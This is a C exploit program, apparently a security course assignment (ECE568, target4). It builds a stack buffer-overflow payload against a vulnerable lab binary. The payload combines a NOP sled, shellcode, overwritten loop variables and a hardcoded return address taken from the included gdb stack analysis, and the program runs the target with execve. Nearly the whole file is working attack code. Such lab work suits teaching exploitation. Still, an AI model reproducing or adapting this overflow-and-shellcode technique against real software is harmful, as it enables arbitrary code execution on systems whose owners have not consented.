#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*
(gdb) break foo
Breakpoint 2 at 0x400b85: file target4.c, line 12

(gdb) info frame
Stack level 0, frame at 0x3021feb0:
 rip = 0x400b85 in foo (target4.c:12); saved rip = 0x400c62
 called by frame at 0x3021fed0
 source language c.
 Arglist at 0x3021fea0, args: arg=0x7fffffffd85d "test"
 Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
 Saved registers:
  rbp at 0x3021fea0, rip at 0x3021fea8

(gdb) p &buf
$1 = (char (*)[156]) 0x3021fdf0
(gdb) p &i
$2 = (int *) 0x3021fe98
(gdb) p &len
$3 = (int *) 0x3021fe9c

Layout of the stack:
<RA 0x3021fea8 - 0x3021feab> 184-187
<unkown2 0x3021fea0 - 0x3021fea7> 176-183
<len 0x3021fe9c - 0x3021fe9f> 172-175
<i 0x3021fe98 - 0x3021fe9b> 168-171
<unkown1 0x3021fe8c - 0x3021fe97> 156-167
<buf 0x3021fdf0 - 0x3021fe8b> 0-155

 */

/* ECE568 BEGIN */
#define NOP '\x90'
#define SHELLCODE_LEN sizeof(shellcode) / sizeof(shellcode[0])
#define STACK_SIZE 0x3021fea8 - 0x3021fdf0
#define RA_LEN 4
#define BUF_TO_OVERFLOW_SIZE STACK_SIZE + RA_LEN

#define BUF_IN_BUF_SIZE 0x3021fe8c - 0x3021fdf0
#define UNKNOWN_IN_BUF_SIZE 0x3021fe98 - 0x3021fe8c
#define I_IN_BUF_SIZE 0x3021fe9c - 0x3021fe98
#define LEN_IN_BUF_SIZE 0x3021fea0 - 0x3021fe9c
#define UNKNOWN2_IN_BUF_SIZE 0x3021fea8 - 0x3021fea0
/* ECE568 END */

int main(void) {
    char *args[3];
    char *env[6];

    /* ECE568 BEGIN */
    char attack_s[BUF_TO_OVERFLOW_SIZE];
    memset(attack_s, 0, BUF_TO_OVERFLOW_SIZE);

    //# NOP
    for (int i = 0; i < BUF_IN_BUF_SIZE - SHELLCODE_LEN + 1; i++) {
        attack_s[i] = NOP;
    }

    //# shellcode
    strcat(attack_s, shellcode);

    //# UNKNOWN
    size_t curr_idx = strlen(attack_s);
    for (int i = curr_idx; i < curr_idx + UNKNOWN_IN_BUF_SIZE; i++) {
        attack_s[i] = NOP;
    }
    curr_idx += UNKNOWN_IN_BUF_SIZE;

    //# i
    int i_null_idx = curr_idx + 1;
    strcpy(&attack_s[curr_idx], "\x01\x00\x00\x00");  // use "\01", otherwise `len` will be equal to 168; have to use `strcpy` instead of `strcat` because there's "\x00" in the middle
    curr_idx += I_IN_BUF_SIZE;

    //# len
    int len_null_idx = curr_idx + 1;
    strcpy(&attack_s[curr_idx], "\x14\x00\x00\x00");  // when `len` is given a new value, `i` already has the value of 5, execute 187 - 172 + 1 = 0x14 - 0x5 = 16 more times to copy len, unkown2, and RA
    curr_idx += LEN_IN_BUF_SIZE;

    //# UNKNOWN2
    for (int i = curr_idx; i < UNKNOWN2_IN_BUF_SIZE + curr_idx; i++) {
        attack_s[i] = NOP;
    }
    curr_idx += UNKNOWN2_IN_BUF_SIZE;

    //# RA
    strcpy(&attack_s[curr_idx], "\xf0\xfd\x21\x30");  // RA

    env[0] = &attack_s[i_null_idx + 1];
    env[1] = &attack_s[i_null_idx + 2];
    env[2] = &attack_s[i_null_idx + 3];
    env[3] = &attack_s[len_null_idx + 1];
    env[4] = &attack_s[len_null_idx + 2];
    env[5] = &attack_s[len_null_idx + 3];
    /* ECE568 END */

    args[0] = TARGET;
    args[1] = attack_s;
    args[2] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
